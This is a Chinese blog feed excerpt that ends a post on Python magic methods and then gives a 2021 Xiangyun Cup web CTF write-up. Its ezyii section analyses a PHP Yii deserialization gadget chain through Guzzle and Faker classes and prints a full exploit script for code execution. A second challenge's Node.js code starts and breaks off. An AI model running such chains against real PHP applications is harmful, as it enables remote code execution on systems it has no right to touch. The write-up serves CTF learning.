|<br>| <strong>new</strong>(cls [,…])             | instance = MyClass(arg1, arg2)   | <strong>new</strong>在实例创建时调用  |<br>| <strong>init</strong>(self [,…])           | instance = MyClass(arg1,arg2)    | <strong>init</strong>在实例创建时调用 |<br>| <strong>cmp</strong>(self)                   | self == other, self &gt; other 等   | 进行比较时调用           |<br>| <strong>pos</strong>(self)                   | +self                            | 一元加法符号             |<br>| <strong>neg</strong>(self)                   | -self                            | 一元减法符号             |<br>| <strong>invert</strong>(self)                | ~self                            | 按位取反                 |<br>| <strong>index</strong>(self)                 | x[self]                          | 当对象用于索引时         |<br>| <strong>nonzero</strong>(self)               | bool(self)                       | 对象的布尔值             |<br>| <strong>getattr</strong>(self, name)         | self.name #name不存在            | 访问不存在的属性         |<br>| <strong>setattr</strong>(self, name)         | self.name = val                  | 给属性赋值               |<br>| <strong>delattr_(self, name)          | del self.name                    | 删除属性                 |<br>| </strong>getattribute<strong>(self,name)     | self.name                        | 访问任意属性             |<br>| </strong>getitem<strong>(self, key)          | self[key]                        | 使用索引访问某个元素     |<br>| </strong>setitem<strong>(self, key)          | self[key] = val                  | 使用索引给某个元素赋值   |<br>| </strong>delitem<strong>(self, key)          | del self[key]                    | 使用索引删除某个对象     |<br>| </strong>iter<strong>(self)                  | for x in self                    | 迭代                     |<br>| </strong>contains<strong>(self, value)       | value in self, value not in self | 使用in进行成员测试       |<br>| </strong>call<strong>(self [,…])           | self(args)                       | “调用”一个实例           |<br>| </strong>enter<strong>(self)                 | with self as x:                  | with声明的上下文管理器   |<br>| </strong>exit<strong>(self, exc, val, trace) | with self as x:                  | with声明的上下文管理器   |<br>| </strong>getstate<strong>(self)              | pickle.dump(pkl_file, self)      | Pickling                 |<br>| </strong>setstate__(self)              | data = pickle.load(pkl_file)     | Pickling                 |</p><h1 id="python2和3中的区别"><a href="#python2和3中的区别" class="headerlink" title="python2和3中的区别"></a>python2和3中的区别</h1><p>在这里，我们记录了几个在对象模型方面 Python 3 和 Python 2.x 之间的主要区别。</p><ul><li>Python 3中string和unicode的区别不复存在，因此<em>_<em>unicode_</em></em>被取消了，<em>_<em>bytes_</em></em>加入进来（与Python 2.7 中的 <em>_<em>str_</em></em>和 <em>_<em>unicode_</em></em>行为类似），用于新的创建字节数组的内建方法。</li><li>Python 3中默认除法变成了 true 除法，因此<em>_<em>div_</em></em>被取消了。</li><li><em>_<em>coerce_</em></em> 被取消了，因为和其他魔法方法有功能上的重复，以及本身行为令人迷惑。</li><li><em>_<em>cmp_</em></em> 被取消了，因为和其他魔法方法有功能上的重复。</li><li><em>_<em>nonzero_</em></em> 被重命名成 <em>_<em>bool_</em></em></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python里的魔法方法&quot;&gt;&lt;a href=&quot;#Python里的魔法方法&quot; class=&quot;headerlink&quot; title=&quot;Python里的魔法方法&quot;&gt;&lt;/a&gt;Python里的魔法方法&lt;/h1&gt;&lt;p&gt;最近准备学习一波python反序列化，于是决定从python</summary>
      
    
    
    
    <category term="基础学习" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="python" scheme="http://www.fxizenta.design/categories/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/python/"/>
    
    
    <category term="python" scheme="http://www.fxizenta.design/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>2021祥云杯_web_wp和复现</title>
    <link href="http://www.fxizenta.design/2021/08/25/xyctf2021wp/"/>
    <id>http://www.fxizenta.design/2021/08/25/xyctf2021wp/</id>
    <published>2021-08-25T13:45:56.000Z</published>
    <updated>2021-08-25T13:51:37.468Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021祥云杯-web-wp"><a href="#2021祥云杯-web-wp" class="headerlink" title="2021祥云杯_web_wp"></a>2021祥云杯_web_wp</h1><p>比赛的wp以及赛后复现，这次比赛总的赛题也更偏向于js和java了，看来php要逐渐退出舞台了吗？（doge</p><h1 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h1><p>yii链子大全见于<a href="https://xz.aliyun.com/t/9948#toc-0">https://xz.aliyun.com/t/9948#toc-0</a></p><p>可惜等我开始做题时，文章作者已经发现影响比赛于是先把涉及比赛的第四条链子下了，下面是对于这个链子利用的分析</p><p>首先出题人还是非常友好的吧要用到的类函数才给了我们（感谢善良的出题人）</p><p>题目明显反序列化，给的源码中也只有一个<code>__destruct</code></p><p>于是入口变的明显起来</p><p>也就是这里</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt="Untitled"></p><p>那么就来看看<code>stopProcess</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stopProcess</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (array_reverse(<span class="keyword">$this</span>-&gt;processes) <span class="keyword">as</span> <span class="variable">$process</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$process</span>-&gt;isRunning()) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output-&gt;debug(<span class="string">&#x27;[RunProcess] Stopping &#x27;</span> . <span class="variable">$process</span>-&gt;getCommandLine());</span><br><span class="line">            <span class="variable">$process</span>-&gt;stop();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;processes = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里有两个可以调用魔术方法的地方，一个是<code>process</code>调用函数可以触发<strong>call,还有就是后面那个字符串可以触发</strong>toString</p><p>唯一的__call</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt="Untitled"></p><p>唯一的__toString</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt="Untitled"></p><p>调用函数的地方有两个一个是processes，一个是getCommandLine，processes在if里，也没法利用,于是就看看下面那个getCommandLine，他是可以和<strong>toString一起配合使用的,那么我们的目标就变成让让process→getCommandLine返回一个有</strong>toString函数的类，也即AppendStream,于是只要让<strong>call返回AppendStream即可成功调用</strong>toString</p><p>而__toString是直接进rewind，然后到seek，seek函数如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$whence</span> = SEEK_SET</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;seekable) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(<span class="string">&#x27;This AppendStream is not seekable&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$whence</span> !== SEEK_SET) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(<span class="string">&#x27;The AppendStream can only seek with SEEK_SET&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;pos = <span class="keyword">$this</span>-&gt;current = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Rewind each stream</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;streams <span class="keyword">as</span> <span class="variable">$i</span> =&gt; <span class="variable">$stream</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="variable">$stream</span>-&gt;rewind();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">RuntimeException</span>(<span class="string">&#x27;Unable to seek stream &#x27;</span></span><br><span class="line">                    . <span class="variable">$i</span> . <span class="string">&#x27; of the AppendStream&#x27;</span>, <span class="number">0</span>, <span class="variable">$e</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以调用其他stream的rewind函数，那先来看看哪些是有这个函数的，发现只有CachingStream</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%203.png" alt="Untitled"></p><p>CachingStream的rewind函数直接调用seek，具体如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rewind</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;seek(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$byte</span> = <span class="variable">$offset</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$diff</span> = <span class="variable">$byte</span> - <span class="keyword">$this</span>-&gt;stream-&gt;getSize();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// Read the remoteStream until we have read in at least the amount</span></span><br><span class="line">            <span class="comment">// of bytes requested, or we reach the end of the file.</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="variable">$diff</span> &gt; <span class="number">0</span> &amp;&amp; !<span class="keyword">$this</span>-&gt;remoteStream-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;read(<span class="variable">$diff</span>);</span><br><span class="line">                <span class="variable">$diff</span> = <span class="variable">$byte</span> - <span class="keyword">$this</span>-&gt;stream-&gt;getSize();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// We can just do a normal seek since we&#x27;ve already seen this byte.</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream-&gt;seek(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现可以调用自己的read函数，即下面这个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// Perform a regular read on any previously read data from the buffer</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;stream-&gt;read(<span class="variable">$length</span>);</span><br><span class="line">        <span class="variable">$remaining</span> = <span class="variable">$length</span> - strlen(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// More data was requested so read from the remote stream</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remaining</span>) &#123;</span><br><span class="line">            <span class="comment">// If data was written to the buffer in a position that would have</span></span><br><span class="line">            <span class="comment">// been filled from the remote stream, then we must skip bytes on</span></span><br><span class="line">            <span class="comment">// the remote stream to emulate overwriting bytes from that</span></span><br><span class="line">            <span class="comment">// position. This mimics the behavior of other PHP stream wrappers.</span></span><br><span class="line">            <span class="variable">$remoteData</span> = <span class="keyword">$this</span>-&gt;remoteStream-&gt;read(</span><br><span class="line">                <span class="variable">$remaining</span> + <span class="keyword">$this</span>-&gt;skipReadBytes</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;skipReadBytes) &#123;</span><br><span class="line">                <span class="variable">$len</span> = strlen(<span class="variable">$remoteData</span>);</span><br><span class="line">                <span class="variable">$remoteData</span> = substr(<span class="variable">$remoteData</span>, <span class="keyword">$this</span>-&gt;skipReadBytes);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;skipReadBytes = max(<span class="number">0</span>, <span class="keyword">$this</span>-&gt;skipReadBytes - <span class="variable">$len</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$data</span> .= <span class="variable">$remoteData</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream-&gt;write(<span class="variable">$remoteData</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而这个read函数，可以调用其他类的read函数，于是我们可以调用PumpStream的read函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="keyword">$this</span>-&gt;buffer-&gt;read(<span class="variable">$length</span>);</span><br><span class="line">        <span class="variable">$readLen</span> = strlen(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;tellPos += <span class="variable">$readLen</span>;</span><br><span class="line">        <span class="variable">$remaining</span> = <span class="variable">$length</span> - <span class="variable">$readLen</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$remaining</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pump(<span class="variable">$remaining</span>);</span><br><span class="line">            <span class="variable">$data</span> .= <span class="keyword">$this</span>-&gt;buffer-&gt;read(<span class="variable">$remaining</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;tellPos += strlen(<span class="variable">$data</span>) - <span class="variable">$readLen</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">pump</span>(<span class="params"><span class="variable">$length</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;source) &#123;</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="variable">$data</span> = call_user_func(<span class="keyword">$this</span>-&gt;source, <span class="variable">$length</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$data</span> === <span class="literal">false</span> || <span class="variable">$data</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;source = <span class="literal">null</span>;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;buffer-&gt;write(<span class="variable">$data</span>);</span><br><span class="line">                <span class="variable">$length</span> -= strlen(<span class="variable">$data</span>);</span><br><span class="line">            &#125; <span class="keyword">while</span> (<span class="variable">$length</span> &gt; <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同样，也就可以使用pump，于是在pump里，我们就可以使用call_user_func这个回调函数，不过我在比赛时也是卡在了这里，因为length只能是数字，实在想不到采用什么利用姿势才能达到catflag的目的，甚至实现rce，下面是事后看daolao的wp学习的</p><p>题目给了一个SerializableClosure类的，这个类允许我们序列化一个匿名函数（正常情况下是不能序列化匿名函数的），而这个类存在一个__invoke方法如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;closure, func_get_args());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>触发时调用如上代码，那么整个payload的最后一环就由一个我们可控的任意代码执行的匿名函数解决</p><p>那现在就简单了通过pump的call_user_func来触发 __invoke进而触发参数完全可以自己把握的<code>call_user_func_array</code>（太秀了这步，之前完全没想到）</p><p>exp（来自先知社区</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;jiang&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>=<span class="number">-10</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">            <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;phpinfo();&#125;;</span><br><span class="line">            <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Secrets-Of-Admin"><a href="#Secrets-Of-Admin" class="headerlink" title="Secrets_Of_Admin"></a>Secrets_Of_Admin</h1><p>账号密码在database可以看到，也可以看到flag在superuser下</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%204.png" alt="Untitled"></p><p>主要是这三个接口</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word 🤬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) 